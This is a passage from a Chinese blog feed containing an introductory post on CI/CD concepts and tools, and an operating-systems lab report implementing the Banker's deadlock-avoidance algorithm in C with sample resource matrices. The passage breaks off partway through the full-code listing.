        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>不仅仅是企业中，我们平时开发时，也可以使用工作流提高开发效率。其实计算机的各种技术的逻辑都来自于生活，所以也比较好理解。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>CICD 是 持续集成（Continuous Integration）和持续部署（Continuous Deployment）简称。指在开发过程中自动执行一系列脚本来减低开发引入 bug 的概率，在新代码从开发到部署的过程中，尽量减少人工的介入。</p><h2 id="持续集成-Continuous-Integration"><a href="#持续集成-Continuous-Integration" class="headerlink" title="持续集成(Continuous Integration)"></a>持续集成(Continuous Integration)</h2><p>现代应用开发的目标是让多位开发人员同时处理同一应用的不同功能。但是，如果企业安排在一天内将所有分支源代码合并在一起（称为“合并日”），最终可能造成工作繁琐、耗时，而且需要手动完成。这是因为当一位独立工作的开发人员对应用进行更改时，有可能会与其他开发人员同时进行的更改发生冲突。如果每个开发人员都自定义自己的本地集成开发环境（IDE），而不是让团队就一个基于云的 IDE 达成一致，那么就会让问题更加雪上加霜。</p><p>持续集成（CI）可以帮助开发人员更加频繁地（有时甚至每天）将代码更改合并到共享分支或“主干”中。一旦开发人员对应用所做的更改被合并，系统就会通过自动构建应用并运行不同级别的自动化测试（通常是单元测试和集成测试）来验证这些更改，确保这些更改没有对应用造成破坏。这意味着测试内容涵盖了从类和函数到构成整个应用的不同模块。如果自动化测试发现新代码和现有代码之间存在冲突，CI 可以更加轻松地快速修复这些错误。</p><h2 id="持续交付-Continuous-Delivery"><a href="#持续交付-Continuous-Delivery" class="headerlink" title="持续交付(Continuous Delivery)"></a>持续交付(Continuous Delivery)</h2><p>完成 CI 中构建及单元测试和集成测试的自动化流程后，持续交付可自动将已验证的代码发布到存储库。为了实现高效的持续交付流程，务必要确保 CI 已内置于开发管道。持续交付的目标是拥有一个可随时部署到生产环境的代码库。</p><p>在持续交付中，每个阶段（从代码更改的合并，到生产就绪型构建版本的交付）都涉及测试自动化和代码发布自动化。在流程结束时，运维团队可以快速、轻松地将应用部署到生产环境中。</p><h2 id="持续部署-Continuous-Deployment"><a href="#持续部署-Continuous-Deployment" class="headerlink" title="持续部署(Continuous Deployment)"></a>持续部署(Continuous Deployment)</h2><p>对于一个成熟的 CI&#x2F;CD 管道来说，最后的阶段是持续部署。作为持续交付——自动将生产就绪型构建版本发布到代码存储库——的延伸，持续部署可以自动将应用发布到生产环境。由于在生产之前的管道阶段没有手动门控，因此持续部署在很大程度上都得依赖精心设计的测试自动化。</p><p>实际上，持续部署意味着开发人员对应用的更改在编写后的几分钟内就能生效（假设它通过了自动化测试）。这更加便于持续接收和整合用户反馈。总而言之，所有这些 CI&#x2F;CD 的关联步骤都有助于降低应用的部署风险，因此更便于以小件的方式（而非一次性）发布对应用的更改。不过，由于还需要编写自动化测试以适应 CI&#x2F;CD 管道中的各种测试和发布阶段，因此前期投资还是会很大。</p><h2 id="具体应用"><a href="#具体应用" class="headerlink" title="具体应用"></a>具体应用</h2><ul><li><p>博客提交工作流</p><p>我的博客其实就是一个小例子，我一般在VScode修改代码或者写文章，然后使用Git扩展一键提交到GitHub的博客源码库里，再通过GitHub Action使用GitHub服务器的资源创建public文件，最终自动上传到源站库中。这也能算得上是利用了CICD的思想。</p><p>相信大家看了上面CICD的介绍以后，能够把博客一键式开发时的环节和CI、CD对应起来了。</p></li><li><p>其他的具体实现</p><p>有很多集成开发软件&#x2F;工具也都希望提高程序员的开发效率，那肯定少不了CI&#x2F;CD的应用。比如下面这些：</p><ol><li><a href="https://gitlab.com/gitlab-org/gitlab-foss">GitLab CI</a></li><li><a href="https://github.com/gocd/gocd">GoCD</a></li><li><a href="https://github.com/travis-ci/travis-ci">Travis CI</a></li><li><a href="https://github.com/jenkinsci/jenkins">Jenkins</a></li><li><a href="https://github.com/concourse/concourse">Concourse CI</a></li><li><a href="https://github.com/spinnaker/spinnaker">Spinnaker</a></li><li><a href="https://github.com/screwdriver-cd/screwdriver">Screwdriver</a><br>…</li></ol></li></ul><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>我们主要学习这种开发思想，这些工具肯定不止这些，而且不同用户的使用习惯也有所不同，选择合适的使用即可。</p><p>另外，上面只是简单介绍了一下CI&#x2F;CD，实现过程中还有很多细节，大家有兴趣请自行了解，不过我觉得有些东西不需要一头扎进去，容易出不来。</p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 自主开发 </tag>
            
            <tag> CI/CD </tag>
            
            <tag> 工作流 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统如何避免死锁？一种方案：银行家算法</title>
      <link href="/posts/3bfd1783.html"/>
      <url>/posts/3bfd1783.html</url>
      <cover>https://www.freeimg.cn/i/2023/12/26/658a5356891be.jpg</cover>
      <date>Thu Nov 23 2023 00:33:08 GMT+0000</date>
      
        <content type="html"><![CDATA[<h1 id="实验二：银行家算法"><a href="#实验二：银行家算法" class="headerlink" title="实验二：银行家算法"></a>实验二：银行家算法</h1><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><ol><li>理解死锁概念，了解导致死锁的原因</li><li>掌握死锁的避免算法，理解安全状态和不安全状态的概念</li><li>理解银行家算法，并应用银行家算法避免死锁</li></ol><h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><p>假定有多个进程对多种资源进行请求，设计银行家算法的数据结构和程序结构，判定是否存在资源分配的安全序列。使用 C 语言或Python 语言编写程序实现这个算法并进行测试</p><p>要求：</p><ol><li>至少5个进程</li><li>至少3类资源</li><li>结果中包含一个安全的请求和一个不安全的请求</li></ol><h2 id="程序流程图"><a href="#程序流程图" class="headerlink" title="程序流程图"></a>程序流程图</h2><p><img src="https://www.freeimg.cn/i/2023/12/19/658134ce0e86c.png" alt="流程图"></p><h2 id="程序代码"><a href="#程序代码" class="headerlink" title="程序代码"></a>程序代码</h2><p>本次使用了 C 语言进行程序编写，开发环境：Ubuntu 20.04，主要代码如下，完整代码在本文最后：</p><h3 id="结构体与变量"><a href="#结构体与变量" class="headerlink" title="结构体与变量"></a>结构体与变量</h3><h4 id="最大需求矩阵"><a href="#最大需求矩阵" class="headerlink" title="最大需求矩阵"></a>最大需求矩阵</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> Max[<span class="number">20</span>][<span class="number">20</span>];             <span class="comment">// Max[i][j]表示进程i对j类资源的最大需求</span></span><br></pre></td></tr></table></figure><h4 id="已分配矩阵"><a href="#已分配矩阵" class="headerlink" title="已分配矩阵"></a>已分配矩阵</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> Allocation[<span class="number">20</span>][<span class="number">20</span>];      <span class="comment">// Allocation[i][j]表示已分配给进程i的j类资源数</span></span><br></pre></td></tr></table></figure><h4 id="需求矩阵"><a href="#需求矩阵" class="headerlink" title="需求矩阵"></a>需求矩阵</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> Need[<span class="number">20</span>][<span class="number">20</span>]; <span class="comment">// Need[i][j]表示进程i当前所需的j类资源数</span></span><br></pre></td></tr></table></figure><h4 id="现可分配资源矩阵"><a href="#现可分配资源矩阵" class="headerlink" title="现可分配资源矩阵"></a>现可分配资源矩阵</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> Available[<span class="number">20</span>]; <span class="comment">// Available[i]表示第i类资源现有资源数</span></span><br></pre></td></tr></table></figure><h4 id="请求列表"><a href="#请求列表" class="headerlink" title="请求列表"></a>请求列表</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> request[<span class="number">20</span>]; <span class="comment">// 申请的资源情况</span></span><br></pre></td></tr></table></figure><h4 id="试分配后恢复"><a href="#试分配后恢复" class="headerlink" title="试分配后恢复"></a>试分配后恢复</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> AllocationStatus[<span class="number">20</span>];    <span class="comment">// 试分配前Allocation的状态</span></span><br><span class="line"><span class="type">int</span> NeedStatus[<span class="number">20</span>];          <span class="comment">// 试分配前Need状态</span></span><br><span class="line"><span class="type">int</span> AvailableStatus[<span class="number">20</span>];     <span class="comment">// 试分配前Available状态</span></span><br></pre></td></tr></table></figure><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> processNum = <span class="number">5</span>;  <span class="comment">// 记录进程个数</span></span><br><span class="line"><span class="type">int</span> resourceNum = <span class="number">3</span>; <span class="comment">// 记录资源类型个数</span></span><br><span class="line"><span class="type">int</span> requireNum = <span class="number">0</span>;  <span class="comment">// 申请进程号</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> WorkStatus[<span class="number">20</span>];          <span class="comment">// 用于检查安全性的工作矩阵</span></span><br><span class="line"><span class="type">bool</span> Finished[<span class="number">20</span>] = &#123;<span class="literal">false</span>&#125;; <span class="comment">// 用于记录进程的完成情况</span></span><br><span class="line"><span class="type">int</span> Safety[<span class="number">20</span>];              <span class="comment">// 安全序列</span></span><br></pre></td></tr></table></figure><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="安全序列判断"><a href="#安全序列判断" class="headerlink" title="安全序列判断"></a>安全序列判断</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">is_safe</span><span class="params">()</span> <span class="comment">// 安全性判断</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i, j, i1 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">bool</span> t = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; resourceNum; i++) <span class="comment">// 把Available赋值给Work</span></span><br><span class="line">    &#123;</span><br><span class="line">        WorkStatus[i] = Available[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; processNum; i++) <span class="comment">// 初始化所有进程未完成</span></span><br><span class="line">    &#123;</span><br><span class="line">        Finished[i] = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; processNum; j++) <span class="comment">// 寻找Need小于等于Work的进程</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (Finished[j])</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            t = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; resourceNum; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (Need[j][i] &lt;= WorkStatus[i])</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    t = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (t)</span><br><span class="line">                <span class="keyword">break</span>; <span class="comment">// 判断第j个进程是否满足Need小于等于Work</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (t &amp;&amp; (Finished[j] == <span class="literal">false</span>)) <span class="comment">// 是否找到Need小于等于Work的进程并且进程未完成</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; resourceNum; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                WorkStatus[i] = WorkStatus[i] + Allocation[j][i];</span><br><span class="line">            &#125;</span><br><span class="line">            Finished[j] = <span class="literal">true</span>; <span class="comment">// 进程完成</span></span><br><span class="line">            Safety[i1] = j+<span class="number">1</span>; <span class="comment">// 安全序列</span></span><br><span class="line">            i1++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; processNum; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (Finished[i])</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">getMax</span><span class="params">()</span>;         <span class="comment">// 获取最大需求矩阵 Max</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">getAllocation</span><span class="params">()</span>;  <span class="comment">// 获取分配矩阵 Allocation</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">getNeed</span><span class="params">()</span>;        <span class="comment">// 计算需求矩阵 Need</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">getAvailable</span><span class="params">()</span>;   <span class="comment">// 获取当前可用资源 Available</span></span><br></pre></td></tr></table></figure><h4 id="银行家算法"><a href="#银行家算法" class="headerlink" title="银行家算法"></a>银行家算法</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 获取最大需求矩阵 Max</span></span><br><span class="line">    getMax();</span><br><span class="line">    <span class="comment">// 获取分配矩阵 Allocation</span></span><br><span class="line">    getAllocation();</span><br><span class="line">    <span class="comment">// 计算需求矩阵 Need</span></span><br><span class="line">    getNeed();</span><br><span class="line">    <span class="comment">// 获取当前可用资源</span></span><br><span class="line">    getAvailable();</span><br><span class="line">    <span class="comment">// 申请前检查一次</span></span><br><span class="line">    <span class="keyword">if</span>(!is_safe())</span><br><span class="line">    &#123;</span><br><span class="line">        red_printf(<span class="string">&quot;The current system is not secure!\nResources could not be allocated.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        green_printf(<span class="string">&quot;The system is secure.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 获取请求信息</span></span><br><span class="line">            getRequirement();</span><br><span class="line">            <span class="comment">// 检查分配后的安全性</span></span><br><span class="line">            <span class="keyword">if</span>(!is_safe())</span><br><span class="line">            &#123;</span><br><span class="line">                red_printf(<span class="string">&quot;After allocation, the system is not secure.\nIt has been restored to its original state!\n&quot;</span>);</span><br><span class="line">                <span class="comment">// 恢复试分配前状态</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; resourceNum; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    Allocation[requireNum<span class="number">-1</span>][i]=AllocationStatus[i];</span><br><span class="line">                    Need[requireNum<span class="number">-1</span>][i]=NeedStatus[i];</span><br><span class="line">                    Available[i]=AvailableStatus[i];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                green_printf(<span class="string">&quot;\nThe request was successful.&quot;</span>);</span><br><span class="line">                blue_printf(<span class="string">&quot;\nA possible safety sequence would be:\n&quot;</span>);</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; processNum<span class="number">-1</span>; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    blue_printf(<span class="string">&quot;%d-&gt;&quot;</span>, Safety[i]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,Safety[processNum<span class="number">-1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// getchar();</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p>传入的进程信息见上述代码</p><h4 id="创新点"><a href="#创新点" class="headerlink" title="创新点"></a>创新点</h4><ol><li>该程序可持续对输入案例进行多次请求，会动态维护资源，只要请求合理，就能不断申请</li><li>如果申请不符合要求，程序会恢复分配前状态</li><li>分配完成后输出分配完以后的资源情况以及一个可行的安全序列</li><li>程序输出字体颜色根据提示信息有所不同</li></ol><h4 id="可行案例（实验提供案例）"><a href="#可行案例（实验提供案例）" class="headerlink" title="可行案例（实验提供案例）"></a>可行案例（实验提供案例）</h4><p><img src="https://www.freeimg.cn/i/2023/12/19/658135113dd1e.png" alt="运行结果"></p><p>已修复：安全队列输出的最后一个进程为白色</p><p>从上面的结果可以判断，进程 P4 申请（3，2，1）后存在安全序列</p><p>查看分配后资源情况以及一个可行的安全序列：</p><p><img src="https://www.freeimg.cn/i/2023/12/19/658135256891e.png" alt="资源情况"></p><p>当申请超过可分配资源时，进程等待：</p><p><img src="https://www.freeimg.cn/i/2023/12/19/658135354ca8b.png"></p><h4 id="不可行案例（课程-PPT-案例）"><a href="#不可行案例（课程-PPT-案例）" class="headerlink" title="不可行案例（课程 PPT 案例）"></a>不可行案例（课程 PPT 案例）</h4><p><img src="https://www.freeimg.cn/i/2023/12/19/6581354213b6a.png"></p><h2 id="规范性输入"><a href="#规范性输入" class="headerlink" title="规范性输入"></a>规范性输入</h2><p>本实验要求进程数至少为5，资源类至少为3</p><p><img src="https://www.freeimg.cn/i/2023/12/19/658135669ba52.png" alt="规范性"></p><p>当请求进程号超过进程数时</p><p><img src="https://www.freeimg.cn/i/2023/12/19/6581357be0a13.png"></p><h2 id="遇到问题"><a href="#遇到问题" class="headerlink" title="遇到问题"></a>遇到问题</h2><h4 id="问题-1"><a href="#问题-1" class="headerlink" title="问题 1"></a>问题 1</h4><p>申请失败时如何恢复原资源情况</p><h4 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案 1"></a>解决方案 1</h4><p>在分配前进行备份，便于分配失败恢复</p><h2 id="结果分析"><a href="#结果分析" class="headerlink" title="结果分析"></a>结果分析</h2><p>本实验报告用到两个测试用例</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">ex1</span><br><span class="line">process          Max               Allocation             Need   </span><br><span class="line">                 r1  r2  r3           r1  r2   r3         r1   r2  r3 </span><br><span class="line">      P0         6   4   3            1   1    0          5    3   3  </span><br><span class="line">      P1         3   2   4            2   0    1          1    2   3</span><br><span class="line">      P2         9   0   3            4   0    2          5    0   1 </span><br><span class="line">      P3         2   2   2            2   1    1          0    1   1 </span><br><span class="line">      P4         3   4   3            0   1    2          3    3   1</span><br><span class="line"></span><br><span class="line">Available</span><br><span class="line">r1  r2  r3</span><br><span class="line">3   3   2</span><br><span class="line">P4申请（3，2，1），是否存在安全序列？</span><br><span class="line"></span><br><span class="line">ex2</span><br><span class="line">process          Max               Allocation             Need   </span><br><span class="line">                 r1  r2  r3           r1  r2   r3         r1   r2  r3 </span><br><span class="line">      P0         7   5   3            0   1    0          7    4   3  </span><br><span class="line">      P1         3   2   2            2   0    0          1    2   2</span><br><span class="line">      P2         9   0   2            3   0    2          6    0   0 </span><br><span class="line">      P3         2   2   2            2   1    1          0    1   1 </span><br><span class="line">      P4         4   3   3            0   0    2          4    3   1</span><br><span class="line"></span><br><span class="line">Available</span><br><span class="line">r1  r2  r3 </span><br><span class="line">3   3   2</span><br><span class="line">P1申请(1，0，2)后，P0申请（0，2，0）</span><br></pre></td></tr></table></figure><p>银行家算法的核心就是试分配后的安全行判断，需要考虑到进程之间的排列组合，找到一种可行的安全序列即可。结果运行以后程序输出应该已经非常清晰了，这里就不再赘述。</p><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span 